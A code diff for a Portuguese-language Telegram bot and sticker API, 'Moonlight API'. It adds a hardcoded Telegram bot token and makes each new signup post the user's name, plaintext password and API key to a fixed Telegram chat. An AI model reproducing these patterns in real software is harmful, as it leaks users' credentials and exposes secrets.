@@ -132,10 +132,24 @@ console.error('Erro ao salvar os dados no banco de dados:', error);
 //====================[ MÓDULOS ]====================\\
 
 const { Telegraf } = require('telegraf');
-
+const os = require('os');
+const hostname = os.hostname();
+let HostOuNao;
+if (hostname === "localhost") {
+HostOuNao = "Termux"
+} else {
+HostOuNao = "Hospedagem paga"
+}
+const fotoMenu = "https://files.catbox.moe/yie1yr.png"
 //====================CONFIGURAÇÕES=====================//
-
-const bot = new Telegraf(tokenTele);
+let bot;
+if (HostOuNao === "Hospedagem paga") {
+bot = new Telegraf(tokenTele);
+} else {
+bot = new Telegraf("8110817449:AAEqBxkRfIQ0zNPpPyqcqP4yUSbYe1RecwA");
+consoleAviso("Api ligada no termux")
+//ctx.reply("Ligado no termux...");
+}
 const PREFIX = "/";
 
 let username = '';
@@ -175,9 +189,12 @@ ctx.state.args = messageText.split(' ').slice(1);
 return next();
 });
 
+async function enviarImg2(ctx, link, texto) {ctx.replyWithPhoto({ url: link }, {caption: texto});}
+async function enviarAd(ctx, link) {await ctx.replyWithAudio({ url: link });}
+
 // Comandos do bot
 bot.start(async (ctx) => {
-enviar(ctx, `${timed}\n\nOlá! 👋  Bem-vindo(a) ao Moonlight API!  Sou a Lunar, sua bot assistente.  Para mais informações sobre a Moonlight API acesse https://moonlight-api.onrender.com`);
+enviarImg2(ctx, "https://files.catbox.moe/qs6ahh.png", `${timed}\n\nOlá! 👋  Bem-vindo(a) ao Moonlight API!  Sou a Lunar, sua bot assistente.  Para mais informações sobre a Moonlight API acesse https://moonlight-api.onrender.com`);
 });
 
 async function resetRequest() {
@@ -192,8 +209,17 @@ await User.updateMany({ isAdm: true }, { saldo: 100000 });
 await User.updateMany({ isPremium: true }, { saldo: 10000 });
 await User.updateMany({ isGold: true }, { saldo: 30000 });
 await User.updateMany({ isLite: true }, { saldo: 1000 });
-await User.updateMany({ isAdm: false, isPremium: false }, { saldo: 100 });
-enviar(ctx, "[ USUÁRIO ] As requests dos usuários foram reiniciadas")
+await User.updateMany({ isAdm: false, isPremium: false, isGold: false, isLite: false }, { saldo: 100 });
+bot.telegram.sendPhoto(
+"7801551329",
+"https://files.catbox.moe/qs6ahh.png",
+{
+caption: `As request dos usuários foram reiniciadas com sucesso`,
+parse_mode: "Markdown",
+reply_markup: {inline_keyboard: [[
+{ text: "Moonlight Api", url: apiLink },
+{ text: "SpeedCloud", url: `https://speedhosting.cloud` }
+]]}});
 } catch (err) {
 console.error('Erro ao resetar requests:', err);
 }
@@ -228,7 +254,7 @@ infoD = `╭━━━〔 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 〕━━━╮
 ┃  ⃟🌙๋࿆.•۟  apagaruser (nome do usuário)
 ┃  ⃟🌙๋࿆.•۟  user (nome do usuário)
 ╰━━━━━━━━━━━━━━━━━━╯`,
-await bot.telegram.sendPhoto(ctx.chat.id, "https://files.catbox.moe/yie1yr.png", {
+await bot.telegram.sendPhoto(ctx.chat.id, fotoMenu, {
 caption: infoD,
 reply_markup: {
 inline_keyboard: [
@@ -459,7 +485,7 @@ const keycode = Math.floor(100000 + Math.random() * 900000).toString();
 const ft = "https://i.pinimg.com/originals/e0/63/ee/e063ee69b75d8502aad9218e648db8e2.jpg";
 const saldo = 100; 
 const level = 0;
-const key = keycode;
+const key = `Moon_${keycode}`;
 const insta = "https://www.instagram.com/moonlight_juliana"
 const zap = "5511999999"
 const yt = "https://m.youtube.com/@Moonlight_Devs"
@@ -468,7 +494,27 @@ let dd;
 if (admList.includes(username)) { dd = true; } else { dd = false; }
 const user = new User({ username, password, key, saldo, level, ft, zap, insta, yt, wallpaper, isAdm: dd, isPremium: dd, isGold: dd });
 await user.save();
-console.log(user)
+bot.telegram.sendPhoto(
+  "7801551329", 
+  "https://files.catbox.moe/qs6ahh.png", 
+  {
+    caption: `O usuário "${username}" acabou de fazer um registro, mais informações abaixo:\n
+Nome: ${username}
+Senha: ${password}
+Adm: ${dd}
+Request: ${saldo}
+ApiKey: Moon\\_${keycode}`,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "Moonlight Api", url: apiLink },
+          { text: "SpeedCloud", url: `https://speedhosting.cloud` }
+        ]
+      ]
+    }
+  }
+);
 req.session.user = user;
 res.redirect('/dashboard');
 
@@ -1710,7 +1756,8 @@ type: "sticker",
 emojimixUrl: imgUrl
 } });
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1772,7 +1819,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 102)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/sakura-botv6/master/FIGURINHAS/Figurinha-emoji/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1791,7 +1839,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 102)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/anya-bot/master/Figurinhas/figu_flork/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1810,7 +1859,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 8051)
  res.send(await getBuffer(`https://raw.githubusercontent.com/badDevelopper/Testfigu/master/fig (${rnd}).webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
 } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1828,7 +1878,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 109)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/sakura-botv6/master/FIGURINHAS/Figurinha-memes/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
 } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1847,7 +1898,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 109)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/sakura-botv6/master/FIGURINHAS/figurinha-anime/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1865,7 +1917,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 43)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/sakura-botv6/master/FIGURINHAS/figurinha-coreana/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  })
 app.all('/api/sticker/figu_bebe', async (req, res) => {
@@ -1879,7 +1932,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 17)
  res.send(await getBuffer(`https://raw.githubusercontent.com/badDevelopper/Apis/master/pack/figbebe/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1898,7 +1952,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 50)
  res.send(await getBuffer(`https://raw.githubusercontent.com/Scheyot2/sakura-botv6/master/FIGURINHAS/figurinha-desenho/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1917,7 +1972,8 @@ if (infoUser) return res.render('error', { aviso: false, aviso2: infoUser });
  var rnd = Math.floor(Math.random() * 50)
  res.send(await getBuffer(`https://raw.githubusercontent.com/badDevelopper/Apis/master/pack/figanimais/${rnd}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
@@ -1950,7 +2006,8 @@ const { pastaName, NomeFig, max } = config[nomesFigu];
  var numero = Math.floor(Math.random() * max)
  res.send(await getBuffer(`https://pedrozz13755.github.io/Arquivos_web/figurinhas/${pastaName}/${NomeFig}${numero}.webp`))
  } catch (e) {
- res.send(msgApi.error)
+ res.send("Deu erro na sua solicitação")
+ console.log(e)
  }
  } catch (error) {
 console.error('Erro no endpoint:', error);
